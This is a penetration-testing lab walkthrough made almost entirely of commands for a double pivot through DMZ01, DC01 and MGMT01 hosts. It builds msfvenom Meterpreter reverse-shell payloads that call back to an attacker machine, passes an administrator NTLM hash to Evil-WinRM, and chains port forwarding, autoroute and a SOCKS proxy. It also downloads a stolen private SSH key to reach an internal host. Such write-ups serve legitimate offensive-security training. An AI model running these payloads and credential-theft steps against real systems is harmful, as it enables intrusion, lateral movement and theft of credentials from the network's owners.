# Double Pivot

## DMZ01

### Creating the Payload for Linux

```sh
my@attack:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=443 -f elf -o shell
```

### Transferring

```sh
my@attack:~$ scp -i id_rsa shell root@inlanefreight.local:/tmp
```

### Handler for DMZ01

```sh
my@attack:~$ sudo msfconsole -q
```

```sh
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.19
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

### DMZ01 to Attack Machine

```sh
root@dmz01:~# chmod +x /tmp/shell
root@dmz01:~# /tmp/shell
```

### Local Port Forwarding

```sh
meterpreter > portfwd add -R -L 10.10.14.19 -l 8443 -p 1234
```

```output title="Output"
[*] Reverse TCP relay created: (remote) [::]:1234 -> (local) 10.10.14.19:8443
```

## DC01

### Creating the Payload for Windows

```sh
my@attack:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o shell.exe
```

### Evil-WinRM

```sh
my@attack:~$ proxychains -q evil-winrm -i 172.16.8.3 -u 'Administrator' -H FD1F7E5564060258EA787DDBB6E6AFA2
```

### Uploading

```pwsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload shell.exe
```

### Handler for DC01

```sh
meterpreter > background
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8443
msf6 exploit(multi/handler) > run
```

### DC01 to Attack Machine

```pwsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\shell.exe
```

### AutoRoute

```sh
meterpreter > run autoroute -s 172.16.9.0/23
```

```output title="Output" hl_lines="4"
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.14.19
[*] Use the -p option to list all active routes
```

## MGMT01

### Proxychains Configuration File

```sh
my@attack:~$ tail /etc/proxychains.conf
```

```ini title="Output" hl_lines="9"
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

### Setting SOCKS Proxy

```sh
meterpreter > background
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run
```

### Downloading Private Key

```pwsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" "ssmallsadm-id_rsa"
```

### SSH to Target

```sh
my@attack:~$ chmod 600 ssmallsadm-id_rsa
my@attack:~$ proxychains -q ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```
